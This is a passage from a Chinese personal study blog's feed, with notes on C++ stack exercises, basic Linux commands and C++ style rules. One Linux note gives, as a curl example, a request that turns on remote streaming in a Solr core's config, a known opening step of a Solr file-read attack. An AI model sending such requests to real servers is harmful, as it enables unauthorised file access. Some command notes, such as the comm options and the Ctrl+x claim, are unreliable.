代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param tokens string字符串vector</span><br><span class="hljs-comment">     * @return int整型</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">evalRPN</span><span class="hljs-params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        stack&lt;<span class="hljs-type">int</span>&gt; stack;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item: tokens)&#123;<br>            <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;+&quot;</span>||item==<span class="hljs-string">&quot;-&quot;</span>||item==<span class="hljs-string">&quot;*&quot;</span>||item==<span class="hljs-string">&quot;/&quot;</span>)&#123;<br>                <span class="hljs-type">int</span> num=stack.<span class="hljs-built_in">top</span>();<br>                stack.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-type">int</span> num2=stack.<span class="hljs-built_in">top</span>();<br>                stack.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;+&quot;</span>)&#123;<br>                    stack.<span class="hljs-built_in">push</span>(num2+num);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;-&quot;</span>)&#123;<br>                    stack.<span class="hljs-built_in">push</span>(num2-num);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;*&quot;</span>)&#123;<br>                    stack.<span class="hljs-built_in">push</span>(num*num2);<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&quot;/&quot;</span>)&#123;<br>                    stack.<span class="hljs-built_in">push</span>(num2/num);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                stack.<span class="hljs-built_in">push</span>(std::<span class="hljs-built_in">stoi</span>(item));<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">top</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC%E6%8F%90%E7%A4%BA.gif"></p></li><li><p>理解</p><ul><li>通过压栈存放临时数据</li></ul></li><li><p>问题</p><ul><li><p>为什么<code>try``catch</code>语句，性能消耗大？</p><blockquote><p>使用 <code>try</code> 和 <code>catch</code> 可以在程序运行时捕获并处理异常。然而，由于异常处理需要额外的开销，如果在代码中频繁地使用 <code>try</code> 和 <code>catch</code>，会对程序的性能产生影响。</p><p>具体来说，当程序出现异常时，C++ 运行时系统需要在堆栈上创建一个异常对象，并执行一系列系统调用来查找匹配的 <code>catch</code> 块。这个过程需要进行堆栈展开（stack unwinding），将程序从异常抛出点回退到能够处理异常的 <code>catch</code> 块处。由于堆栈展开需要降低程序的执行速度，并且需要额外的内存和调用开销，因此异常处理可能会对程序的性能产生负面影响。</p><p>总的来说，在代码中使用 <code>try</code> 和 <code>catch</code> 不会直接影响程序的性能，但是在发生异常时需要进行额外的处理，从而可能导致程序变慢。因此，在实际编写代码时，应该避免滥用异常处理，仅在必要时使用 <code>try</code> 和 <code>catch</code> 来处理异常，以提高程序的性能和效率。</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux随记</title>
    <link href="/2023/04/19/linux/linux%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/04/19/linux/linux%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="linux随记"><a href="#linux随记" class="headerlink" title="linux随记"></a>linux随记</h1><ol><li><p>sudo </p><p>在Linux系统中，sudo是一种特殊权限（superuser do）命令，允许普通用户以超级管理员的身份执行特定任务或命令。管理员可以使用sudo命令来授权其他用户执行某些特定操作，而无需共享root账户密码</p></li><li><p><code>Ctrl+l</code></p><p>清屏 </p></li><li><p><code>-R</code></p><p>表示递归的参数，用于文件夹相关的参数</p></li><li><p><code>su - root</code></p><p>切换到<code>root</code>用户</p></li><li><p><code>exit</code></p><p>用于退出<code>root</code></p></li><li><p><code>|</code>管道符</p><p>把管道符左边的结果，作为右边命令的输入</p></li><li><p><code>Ctrl+x</code></p><p>也可以用于退出<code>root</code></p></li><li><p><code>shell</code>编程里面</p><p><code>#</code>后面都是注释</p></li><li><p><code>./</code>执行文件</p></li><li><p>使用find查找最近几天有过改动的文件</p><blockquote><p>find &#x2F;home&#x2F;book -mtime -2 &#x2F;&#x2F;查找&#x2F;home目录下两天内有变动的文件。</p></blockquote></li><li><p>curl 发送一个数据POST请求</p><blockquote><p>curl -i -s -k -X ‘POST’ -H ‘Content-Type: application&#x2F;json’ –data-binary ‘{“set-property”:{“requestDispatcher.requestParsers.enableRemoteStreaming”:true}}’ <a href="http://192.168.157.45:9977/solr/new_core/config">http://192.168.157.45:9977/solr/new_core/config</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">-i 在输出包含HTTP响应头<br>-s 静默模式  不输出发送的<br>-k 忽略证书验证<br>-X 是指定http的发送方式<br>-d 是指定的参数<br>--data-binary  二进制数据包<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用指令</title>
    <link href="/2023/04/17/linux/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2023/04/17/linux/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><ol><li><p><code>LInux</code>的根目录是树形结构</p><p>Linux没有盘符（C盘等）的概念，只有一个根目录<code>/</code></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png"></p></li><li><p>文件路径的描述方式</p><p>使用<code>/</code></p><p><code>windows</code>使用<code>\</code></p><ul><li>注意文件路径的开始必须是<code>/</code>,第一个是根目录，后面的是层级关系</li></ul></li></ol><h2 id="LInux命令入门"><a href="#LInux命令入门" class="headerlink" title="LInux命令入门"></a>LInux命令入门</h2><ol><li><p>通用格式</p><p><code>command [-options] [parameter]</code></p><ul><li>command 命令本身</li><li>-options 可选的选项(非必填)</li><li>parameter 可选的选项(非必填)</li></ul></li><li><p>ls -r &#x2F;home</p><p>查看<code>home</code>里面的东西</p></li></ol><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a><code>ls</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/ls%E5%91%BD%E4%BB%A4.png"></p><ul><li><p>默认的工作目录是<code>home</code>目录</p></li><li><p>以平埔的形式展示子目录</p></li><li><p>小结</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/ls%E6%80%BB%E7%BB%93.png"></p></li></ul><ol><li><p>ls 的参数</p><ul><li><code>-a</code> all 列出全部文件（包括隐藏文件）</li><li><code>-l</code> 以列表的形式展示内容，并展示更多的信息</li><li>组和（指的是多个指令同时）<ul><li><code>-l -a</code></li><li><code>-ls</code></li><li><code>-al</code></li></ul></li><li><code>ls -l -a /</code>在根目录上使用<code>-a -l</code></li></ul><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/ls%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93.png"></p></li></ol><h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a><code>cd</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/cd.png"></p><h3 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a><code>pwd</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/pwd.png"></p><ul><li><code>.</code>表示当前目录</li><li><code>..</code>表示上一级目录</li><li><code>~</code>表示<code>home</code>目录</li></ul><h3 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a><code>mkdir</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/mkdir.png"></p><ul><li><p><code>-p</code> 创建一整个链条</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/mkdir_p.png"></p></li></ul><h3 id="touch"><a href="#touch" class="headerlink" title="touch"></a><code>touch</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/touch.png"></p><p>如果原来有这个文件，则修改这个文件的标签，使得时间域本电脑时间一致</p><p>如果没有这个文件，则创建这个文件</p><ol><li><p>文件夹的颜色时深色</p><p>同时还可以使用<code>ls</code>如果前缀是<code>d</code>则是文件夹，是<code>-</code>是文件</p></li></ol><h3 id="comm"><a href="#comm" class="headerlink" title="comm"></a><code>comm</code></h3><p>比较已排序的两个人间的差异</p><ul><li><code>-1</code>：不打印出只存在于第一个文件中的行。</li><li><code>-2</code>：不打印出只存在于第二个文件中的行。</li><li><code>-3</code>：不打印出共同存在于两个文件中的行。</li><li><code>-i</code>：在比较时忽略大小写。</li><li><code>-u</code>：以一列输出文件的内容。</li></ul><h3 id="wc"><a href="#wc" class="headerlink" title="wc"></a><code>wc</code></h3><p>是一种计算文件字数、行数、字符数等信息的命令。它可以统计给定文件中的行数、单词数和字符数。</p><ul><li><code>-l</code>：仅显示行数。</li><li><code>-w</code>：仅显示单词数。</li><li><code>-m</code>：仅显示字符数。</li><li><code>-c</code>：仅显示字节数。</li><li><code>-L</code>：仅显示最长行的长度。</li></ul><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a><code>grep</code></h3><p>是一种命令行文本搜索工具，它可以根据用户提供的正则表达式在一个或多个文件中搜索匹配的行，并将其输出到标准输出。</p><ul><li><code>-c</code>：只显示搜索结果的数量，而不是每一行的内容。</li><li><code>-i</code>：忽略所搜索单词的大小写。</li><li><code>-n</code>：在输出结果中包含被匹配行的行号。</li><li><code>-v</code>：反转匹配，只输出不匹配的行。</li><li><code>-r</code>：递归搜索文件夹内所有文件。</li></ul><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a><code>cat</code></h3><ol><li><p>查看文件内容</p><p>语法： <code>cat [options] filename</code></p><p>示例： <code>cat file.txt</code></p><p>说明：该命令可以查看指定的文本文件内容。如果需要同时查看多个文件内容，可以在命令行中依次输入多个文件名即可。</p></li><li><p>创建文件</p><p>语法：<code>cat &gt; filename</code></p><p>示例： <code>cat &gt; test.txt</code></p><p>说明：该命令可以在命令行中输入文本，然后以Ctrl + D的方式结束输入，并将输入内容保存到指定的文件中。如果文件已经存在，新输入的内容会覆盖旧的内容。</p></li><li><p>合并多个文件</p><p>语法： <code>cat [option] file1 file2 &gt; newfile</code></p><p>示例： <code>cat file1.txt file2.txt &gt; mergedfile.txt</code></p><p>说明：该命令可以将多个文件合并为一个新文件。在上面的示例中，两个文件(file1.txt和file2.txt)的内容被合并到一个新文件(mergedfile.txt)中。</p></li><li><p>压缩输出信息</p><p>语法： <code>cat [options] filename | gzip &gt; filename.gz</code></p><p>示例： <code>cat file.txt | gzip &gt; file.gz</code></p></li></ol><h3 id="more"><a href="#more" class="headerlink" title="more"></a><code>more</code></h3><ol><li>more可以用于查看，相对于<code>cat</code>，<code>more</code>支持翻页</li><li>使用<code>q</code>退出浏览状态</li></ol><h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a><code>cp</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/cp%E5%91%BD%E4%BB%A4.png"></p><h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a><code>mv</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/mv.png"></p><p>如果目的地不存在，那么这个文件就会改名成为目标文件</p><p>而且支持文件夹的移动</p><h3 id="rm"><a href="#rm" class="headerlink" title="rm"></a><code>rm</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/rm.png"></p><p>注意删除文件夹需要<code>-r</code></p><p>可以写多个参数，表示删除多个项目</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/rm%E9%80%9A%E9%85%8D%E7%AC%A6.png"></p><h3 id="which"><a href="#which" class="headerlink" title="which"></a><code>which</code></h3><p>用于查找命令的执行文件</p><ol><li><p>语法</p><p><code>which</code> 要查找的命令</p></li></ol><h3 id="find"><a href="#find" class="headerlink" title="find"></a><code>find</code></h3><p>用于查找文件</p><ol><li><p>命令</p><p><code>find / -name &quot;filename&quot;</code></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/find.png"></p></li><li><p>也可以使用通配符</p><p><code>find 起始路径 -name &quot;*text*&quot;</code></p></li><li><p>使用文件大小</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/find%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F.png"></p></li></ol><h3 id="grep-1"><a href="#grep-1" class="headerlink" title="grep"></a><code>grep</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/grep.png"></p><h3 id="wc-1"><a href="#wc-1" class="headerlink" title="wc"></a><code>wc</code></h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/wc.png"></p><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a><code>echo</code></h3><p>在对话框中打印</p><ol><li><p>语法</p><p><code>echo</code> 输出的内容</p></li><li><p>反引号 </p><p>&#96;&#96;将所包括的内容作为命令输出</p></li><li><p>重定向符</p><p><code>&gt;</code> 将左侧命令覆盖到写入到符号右侧指定的文件中</p><p><code>&gt;&gt;</code>将左侧命令的结果，追加到右侧的指定文件中</p></li></ol><h3 id="vim文本编辑器"><a href="#vim文本编辑器" class="headerlink" title="vim文本编辑器"></a><code>vim</code>文本编辑器</h3><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/vim.png"></p><ol><li><p><code>vim</code> 文件路径</p><p>如果不存在，将会编写新的文件</p><p>存在就只会编辑已有的命令</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/vim%E7%9B%B8%E5%85%B3%E6%A8%A1%E5%BC%8F.png"></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F%E5%BF%AB%E6%8D%B7%E9%94%AE.png"></p></li></ol><h3 id="ln"><a href="#ln" class="headerlink" title="ln"></a><code>ln</code></h3><p>它的功能是为某一个文件在另外一个位置建立一个同步的链接。</p><p>可以看成创建一个快捷方式</p><h3 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a><code>chmod</code></h3><blockquote><p>chmod [权限设置方式] [文件名]</p></blockquote><ol><li><p>它允许用户改变文件或目录的读取、写入和执行权限。它可用于设置文件的所有者、组、其他用户的访问权限。</p></li><li><p>权限表示有读(r)、写(w)、执行(x)三种，用字母或数字来表示。其中，字母表示法为 “u” 表示文件所有者，”g” 表示文件所属组，”o” 表示其他用户， “a” 表示所有用户。</p><ul><li><p>数字表示法</p><p>- </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">644</span> example.txt<br></code></pre></td></tr></table></figure><p>将文件 example.txt 的权限修改为 6（110）（所有者读写）、4（100）（组只读）和 4（100）（其他用户只读）。</p></li><li><p>符号表示法</p><p>使用符号表示法，命令格式为：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">chmod [who] [+ | - | =] [permission] <span class="hljs-symbol">FILE</span>...<br></code></pre></td></tr></table></figure><p>其中 [who] 可以是 u（所有者）、g（所属组）、o（其他用户）、a（所有用户），+ 表示新增权限，- 表示移除权限，&#x3D; 表示赋予权限。</p></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统概述</title>
    <link href="/2023/04/17/linux/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/04/17/linux/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>计算机由哪两个部分组成</p><p>软件和硬件</p></li><li><p>操作系统是什么？</p><p>操作系统是软件的一种</p><p>主要作用是协助用户调度硬件工作充当用户和计算机硬件之间的桥梁</p></li><li><p>不同文件的用途</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有效括号序列</title>
    <link href="/2023/04/17/%E7%AE%97%E6%B3%95/newcoder/%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7%E5%BA%8F%E5%88%97/"/>
    <url>/2023/04/17/%E7%AE%97%E6%B3%95/newcoder/%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/37548e94a270412c8b9fb85643c8ccc2?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">有效括号序列_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7%E5%BA%8F%E5%88%97.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * @param s string字符串 </span><br><span class="hljs-comment">     * @return bool布尔型</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>                stack&lt;<span class="hljs-type">char</span>&gt; stack;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;item: s) &#123;<br>            <span class="hljs-keyword">if</span> (item == <span class="hljs-string">&#x27;[&#x27;</span> || item == <span class="hljs-string">&#x27;(&#x27;</span> || item == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>                stack.<span class="hljs-built_in">push</span>(item);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (item == <span class="hljs-string">&#x27;]&#x27;</span> || item == <span class="hljs-string">&#x27;)&#x27;</span> || item == <span class="hljs-string">&#x27;&#125;&#x27;</span>)&#123;<br>                <span class="hljs-keyword">if</span>(stack.<span class="hljs-built_in">empty</span>())&#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<span class="hljs-comment">//防止栈区为empty，还取出top</span><br>                <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;]&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">if</span>(stack.<span class="hljs-built_in">top</span>()!=<span class="hljs-string">&#x27;[&#x27;</span>)&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;)&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">if</span>(stack.<span class="hljs-built_in">top</span>()!=<span class="hljs-string">&#x27;(&#x27;</span>)&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;&#125;&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">if</span>(stack.<span class="hljs-built_in">top</span>()!=<span class="hljs-string">&#x27;&#123;&#x27;</span>)&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!stack.<span class="hljs-built_in">empty</span>())&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//防止出现只有右开口符号的请情况</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <br>&#125;;<br></code></pre></td></tr></table></figure><p>改进代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * @param s string字符串 </span><br><span class="hljs-comment">     * @return bool布尔型</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isValid</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        stack&lt;<span class="hljs-type">char</span>&gt; stack;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item:s)&#123;<br>            <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;[&#x27;</span>)&#123;<br>                stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;]&#x27;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;&#123;&#x27;</span>)&#123;<br>                stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;&#125;&#x27;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==<span class="hljs-string">&#x27;(&#x27;</span>)&#123;<br>                stack.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;)&#x27;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(stack.<span class="hljs-built_in">empty</span>())&#123;<br>                <span class="hljs-comment">//防止空取top</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(item==stack.<span class="hljs-built_in">top</span>())&#123;<br>                stack.<span class="hljs-built_in">pop</span>();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//提高执行效率，如果不对应，就直接返回</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> stack.<span class="hljs-built_in">empty</span>();<br>        <span class="hljs-comment">//当true,则说明一一对应</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E6%9C%89%E6%95%88%E6%8B%AC%E5%8F%B7%E5%BA%8F%E5%88%97%E6%8F%90%E7%A4%BA.gif"></p></li><li><p>理解</p><ul><li>整体只会遍历一次，遇到开口向右的符号就存进<code>stack</code>，反之对比出栈</li></ul></li><li><p>问题</p><ul><li><p>为什么返回<code>stack.empty()</code></p><blockquote><p>有且仅当，一一对应时才能返回</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cpp代码规范</title>
    <link href="/2023/04/14/c++/cpp%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/"/>
    <url>/2023/04/14/c++/cpp%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="c-代码规范"><a href="#c-代码规范" class="headerlink" title="c++代码规范"></a>c++代码规范</h1><h2 id="基本代码规范"><a href="#基本代码规范" class="headerlink" title="基本代码规范"></a>基本代码规范</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p><strong>方法一</strong></p><ol><li>包括两个文件一个是<code>inc</code>这个目录放<code>.h</code>文件，还有一个<code>src</code>目录，放置<code>.cpp</code>文件。</li></ol><p><strong>方法二</strong></p><ol><li>按照功能分文件</li></ol><h3 id="头文件结构"><a href="#头文件结构" class="headerlink" title="头文件结构"></a>头文件结构</h3><p><strong>处理方式一</strong></p><ol><li>使用<code>ifndef</code>&#x2F;<code>define</code>&#x2F;<code>endif</code></li></ol><p><strong>处理方式二</strong></p><ol><li>使用<code>#pragma once</code></li></ol><h3 id="头文件的包含"><a href="#头文件的包含" class="headerlink" title="头文件的包含"></a>头文件的包含</h3><ol><li>使用路径包括</li></ol><h3 id="名字空间"><a href="#名字空间" class="headerlink" title="名字空间"></a>名字空间</h3><ol><li>建议使用二级命名空间，第一个命名空间是项目名称，第二个是模块名称</li></ol><h3 id="代码行的使用"><a href="#代码行的使用" class="headerlink" title="代码行的使用"></a>代码行的使用</h3><ol><li><p>一行代码只做一件事</p></li><li><p>在定义变量的时候初始化变量</p><img 